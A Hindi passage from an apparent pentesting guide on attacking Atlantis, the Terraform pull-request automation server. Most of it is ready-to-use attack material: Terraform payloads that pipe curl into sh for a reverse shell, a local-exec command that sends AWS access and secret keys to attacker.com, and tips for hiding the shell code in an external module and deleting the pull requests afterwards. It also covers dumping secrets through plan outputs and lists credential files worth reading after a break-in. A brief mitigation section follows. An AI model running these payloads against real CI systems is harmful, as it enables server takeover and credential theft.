рдЖрдк рдпрд╣ рдХреИрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

## рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдХрдорд╛рдВрдб

[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) рдЖрдк рдЙрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЛ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## рд╣рдорд▓реЗ

{% hint style="warning" %}
рдпрджрд┐ рдЖрдк рдЙрддреНрдкреАрдбрд╝рди рдХреЗ рджреМрд░рд╛рди рдЗрд╕ **рддреНрд░реБрдЯрд┐** рдХреЛ рдкрд╛рддреЗ рд╣реИрдВ: `Error: Error acquiring the state lock`

рддреЛ рдЖрдк рдЗрд╕реЗ рдареАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рджреНрд╡рд╛рд░рд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рдХрд░:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдпреЛрдЬрдирд╛ RCE - рдХреЙрдиреНрдлрд╝рд┐рдЧ рд╕рдВрд╢реЛрдзрди рдирдП рдкреАрдЖрд░ рдореЗрдВ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдкрд░ рд▓реЗрдЦрди рдПрдХреНрд╕реЗрд╕ рд╣реИ рддреЛ рдЖрдк рдЙрд╕ рдкрд░ рдПрдХ рдирдпреА рд╢рд╛рдЦрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдкреАрдЖрд░ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк **`atlantis plan` рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдпрд╛ рд╢рд╛рдпрдж рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ) **рддреЛ рдЖрдк рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ RCE рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЖрдк рдЗрд╕реЗ [**рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдХреЛ рдПрдХ рдмрд╛рд╣реНрдп рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд рд▓реЛрдб рдХрд░рдиреЗ**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) рдХреЗ рджреНрд╡рд╛рд░рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдмрд╕ `main.tf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдбрд╛рд▓реЗрдВ:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### рдЧреБрдкреНрддрддрд░ рд╣рдорд▓рд╛

рдЖрдк рдЗрд╕ рд╣рдорд▓рд╛ рдХреЛ рдПрдХ **рдЧреБрдкреНрддрддрд░ рддрд░реАрдХреЗ рд╕реЗ** рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрди рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ:

* рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕реАрдзреЗ рд░реЗрд╡ рд╢реИрд▓ рдЬреЛрдбрд╝рдиреЗ рдХреА рдмрдЬрд╛рдп, рдЖрдк рдПрдХ рдмрд╛рд╣реНрдп рд╕рдВрд╕рд╛рдзрди рдХреЛ **рд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рд░реЗрд╡ рд╢реИрд▓ рд╣реЛ:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
рдЖрдк рдпрд╣рд╛рдБ [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) рдкрд░ rev shell рдХреЛрдб рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

* рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рдореЗрдВ, **ref** рдлреАрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ **terraform rev shell рдХреЛрдб рдХреЛ рд░рд┐рдкреЛ рдореЗрдВ рдПрдХ рд╢рд╛рдЦрд╛ рдореЗрдВ рдЫреБрдкрд╛ рд╕рдХреЗрдВ**, рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **рдЗрд╕рдХреЗ рдмрдЬрд╛рдп** Atlantis рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдорд╛рд╕реНрдЯрд░ рдкрд░ PR рдмрдирд╛рдиреЗ** рдХреА рдмрдЬрд╛рдп, **2 рд╢рд╛рдЦрд╛рдПрдВ рдмрдирд╛рдПрдВ** (test1 рдФрд░ test2) рдФрд░ **рдПрдХ рд╕реЗ рджреВрд╕рд░реЗ рддрдХ PR рдмрдирд╛рдПрдВ**ред рдЬрдм рдЖрдк рд╣рдорд▓рд╛ рдкреВрд░рд╛ рдХрд░ рд▓реЗрдВ, рддреЛ **PR рдФрд░ рд╢рд╛рдЦрд╛рдПрдВ рд╣рдЯрд╛ рджреЗрдВ**ред

### Atlantis plan Secrets Dump

рдЖрдк **terraform рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** `atlantis plan` (`terraform plan`) рдЪрд▓рд╛рдХрд░, рдЬреИрд╕реЗ рдХрд┐ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдбрд╛рд▓рдХрд░:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдПрдкреНрд▓рд╛рдИ RCE - рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЙрдбрд┐рдлрд╝рд┐рдХреЗрд╢рди рдиреНрдпреВ рдкреАрдЖрд░ рдореЗрдВ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдкрд░ рд░рд╛рдЗрдЯ рдПрдХреНрд╕реЗрд╕ рд╣реИ рддреЛ рдЖрдк рдЙрд╕ рдкрд░ рдПрдХ рдирдпреА рдмреНрд░рд╛рдВрдЪ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдкреАрдЖрд░ рдЬреЗрдирд░реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк **`atlantis apply` рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ RCE рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ рдЖрдо рддреМрд░ рдкрд░ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рджрд╛рдЦрд┐рд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:

* **рдорд░реНрдЬреЗрдмрд▓**: рдпрджрд┐ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдореЗрдВ рд╕реЗрдЯ рдХреА рдЧрдИ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдХреЗрд╡рд▓ **`atlantis apply` рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдкреАрдЖрд░ рдорд░реНрдЬреЗрдмрд▓ рд╣реИ** (рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдмреНрд░рд╛рдВрдЪ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рджрд╛рдЦрд┐рд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)ред
* [**рдмреНрд░рд╛рдВрдЪ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рджрд╛рдЦрд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреЛрдЯреЗрдВрд╢рд┐рдпрд▓ рдмрд╛рдпрдкрд╛рд╕**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md) рджреЗрдЦреЗрдВ
* **рдордВрдЬреВрд░**: рдпрджрд┐ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдореЗрдВ рд╕реЗрдЯ рдХреА рдЧрдИ рд╣реИ, рддреЛ рдХреБрдЫ **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреАрдЖрд░ рдХреЛ рдордВрдЬреВрд░реА рджреЗрдиреА рд╣реЛрдЧреА** рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдЖрдк `atlantis apply` рдЪрд▓рд╛ рд╕рдХреЗрдВ
* рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк [**рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рджрд╛рдЦрд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧрд┐рдЯрдмреЙрдЯ рдЯреЛрдХрди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

**`terraform apply` рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдлрд╝рд╛рдЗрд▓ рдкрд░ рдЪрд▓рд╛рдирд╛** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**ред**\
рдЖрдкрдХреЛ рдмрд╕ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реИ рдХрд┐ рдХреБрдЫ рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡рд╛рд▓реЗ `main.tf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдПрдВ:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
### рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдВрдЬреЗрдХреНрд╢рди

рдЬрдм `atlantis plan` рдпрд╛ `atlantis apply` рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рддреЛ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдЕрдВрджрд░-рдЬрд░реВрд░рдд рд╣реЛрддрд╛ рд╣реИ, рдЖрдк рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдХреЛ рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╕реЗ рдХрдореЗрдВрдЯ рдХрд░рдХреЗ рдХрдорд╛рдВрдб рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
### рдХрд╕реНрдЯрдо рд╡рд░реНрдХрдлрд╝реНрд▓реЛ

**`atlantis.yaml`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХрд╕реНрдЯрдо рдмрд┐рд▓реНрдб рдХрдорд╛рдВрдб** рдЪрд▓рд╛рдирд╛ред рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдкреБрд▓ рдЕрдиреБрд░реЛрдз рд╢рд╛рдЦрд╛ рд╕реЗ `atlantis.yaml` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, **рдирд╣реАрдВ** `master` рдХрд╛ред  
рдЗрд╕ рд╕рдВрднрд╛рд╡рдирд╛ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:

{% hint style="danger" %}
рдпрджрд┐ [**рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧ**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) рдзреНрд╡рдЬ `allow_custom_workflows` рдХреЛ **рд╕рд╣реА** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рдкреНрд░рддреНрдпреЗрдХ рд░реЗрдкреЛ рдХреЗ **`atlantis.yaml`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдпрд╣ рднреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ **`allowed_overrides`** рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **`workflow`** рдХреЛ рднреА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╕рд░реНрд╡рд░ рдореЗрдВ RCE рдХреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджреЗрдЧрд╛ рдЬреЛ рдЙрд╕ рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ**ред
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### рдмрд╛рдпрдкрд╛рд╕ рдкреНрд▓рд╛рди/рд▓рд╛рдЧреВ рд╕реБрд░рдХреНрд╖рд╛

рдпрджрд┐ [**рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧ**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) рдзреНрд╡рдЬ `allowed_overrides` _рдХреЛ_ `apply_requirements` рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рд░рд┐рдкреЛ рдиреЗ **рдкреНрд▓рд╛рди/рд▓рд╛рдЧреВ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рд╕рдВрднрд╡ рд╣реИред
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдЕрдЧрд░ рдХреЛрдИ **`atlantis plan/apply` рдЯрд┐рдкреНрдкрдгрд┐рдпрд╛рдБ рдЖрдкрдХреЗ рд╡реИрдз рдкреБрд▓ рдЕрдиреБрд░реЛрдзреЛрдВ рдкрд░ рднреЗрдЬрддрд╛ рд╣реИ,** рддреЛ рдпрд╣ рддрдм рдЪрд▓рд╛рдПрдЧрд╛ рдЬрдм рдЖрдк рдЪрд╛рд╣рддреЗ рдирд╣реАрдВ рд╣реИред

рдФрд░ рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЕрдЧрд░ рдЖрдкрдиреЗ **рд╢рд╛рдЦрд╛ рд╕рдВрд░рдХреНрд╖рдг** рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЙрд╕рдореЗрдВ **рдирдпрд╛ рдХрдорд┐рдЯ рдкреБрд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рддреЛ рд╣рд░ рдкреАрдЖрд░ рдкреБрдирдГ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреЗ рд▓рд┐рдП рдкреВрдЫрдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЛрдИ **рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** (рдкрд┐рдЫрд▓реЗ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ) рддреЗрд░рд╛реЮреЙрд░реНрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ, `atlantis plan/apply` рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рд╣реИ **рд╕реЗрдЯрд┐рдВрдЧ** рдЧрд┐рдЯрд╣рдм рд╢рд╛рдЦрд╛ рд╕рдВрд░рдХреНрд╖рдг рдореЗрдВ:

![](<../.gitbook/assets/image (216).png>)

### рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░реЗрдЯ

рдЕрдЧрд░ рдЖрдк **рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░реЗрдЯ** рдХреЛ рдЪреБрд░рд╛ рд▓реЗрддреЗ рд╣реИрдВ рдпрд╛ рдЕрдЧрд░ рд╡рд╣рд╛рдБ **рдХреЛрдИ рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░реЗрдЯ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛** рд╣реИ, рддреЛ рдЖрдк **рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╡реЗрдмрд╣реБрдХ** рдХреЛ рдмреБрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕реАрдзреЗ **рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдХрдорд╛рдВрдб** рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдмрд┐рдЯрдмрдХреЗрдЯ

рдмрд┐рдЯрдмрдХреЗрдЯ рдХреНрд▓рд╛рдЙрдб **рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**ред рдпрд╣ рдЖрдХреНрд░рдордгрдХрд╛рд░рд┐рдпреЛрдВ рдХреЛ рдмрд┐рдЯрдмрдХреЗрдЯ рд╕реЗ **рдлрд░реНрдЬреА рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдХреЗрд╡рд▓ рдмрд┐рдЯрдмрдХреЗрдЯ IPs рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣реЗ рд╣реИрдВред

* рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдХреЛ **рдлрд░реНрдЬреА рдЕрдиреБрд░реЛрдз** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдмрд┐рдЯрдмрдХреЗрдЯ рд╕реЗ рдЖ рд░рд╣рд╛ рд╣реИред
* рдпрджрд┐ рдЖрдк `--repo-allowlist` рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЙрдиреНрд╣реЗрдВ рдХреЗрд╡рд▓ рдЙрди рд░реЗрдкреЛрдВ рдХреЗ рд╕рдВрдмрдВрдзрд┐рдд рдлрд░реНрдЬреА рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИ рддреЛ рдЙрдирдХрд╛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдиреБрдХрд╕рд╛рди рд╡рд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЗ рдЕрдкрдиреЗ рд░реЗрдкреЛрдВ рдкрд░ рдпреЛрдЬрдирд╛/рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, [рдмрд┐рдЯрдмрдХреЗрдЯ рдХреЗ рдЖрдИрдкреА рдкрддреЛрдВ](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдВ (рдЖрдЙрдЯрдмрд╛рдЙрдВрдб рдЖрдИрдкреАрд╡реА4 рдкрддреЗ рджреЗрдЦреЗрдВ)ред

## рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди

рдпрджрд┐ рдЖрдкрдиреЗ рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХреА рд╣реИ рдпрд╛ рдХрдо рд╕реЗ рдХрдо рдЖрдкрдХреЛ рдПрд▓рдПрдлрдЖрдИ рд╣реИ рддреЛ рдпрд╣рд╛рдВ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдкрдХреЛ рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:

* `/home/atlantis/.git-credentials` VCS рдПрдХреНрд╕реЗрд╕ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ
* `/atlantis-data/atlantis.db` рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде VCS рдПрдХреНрд╕реЗрд╕ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` рдЯреЗрд░рд╛реЮреЙрд░реНрдо рд╕реНрдЯреЗрдЯ рдлрд╝рд╛рдЗрд▓
* рдЙрджрд╛рд╣рд░рдг: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕
* `/proc/[2-20]/cmdline` `atlantis server` рдХрд╛ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди (рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)

## рд╕рдВрд░реЛрдзрди

### рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реЗрдкреЛрдЬрд╝ рдкрд░ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

рдХреНрдпреЛрдВрдХрд┐ рдХрд┐рд╕реА рднреА рд╡реНрдпрдХреНрддрд┐ рдХреЛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреБрд▓ рдЕрдиреБрд░реЛрдзреЛрдВ рдкрд░ рдЯрд┐рдкреНрдкрдгреА рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рднрд▓реЗ рд╣реА рд╕рднреА рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрд░реЛрдзрди рдЙрдкрд▓рдмреНрдз рд╣реЛ, рд╕рд╣реА рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рдмрд┐рдирд╛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реЗрдкреЛрдЬрд╝ рдкрд░ рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЪрд▓рд╛рдирд╛ рдЦрддрд░рдирд╛рдХ рд╣реИред

### `--allow-fork-prs` рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

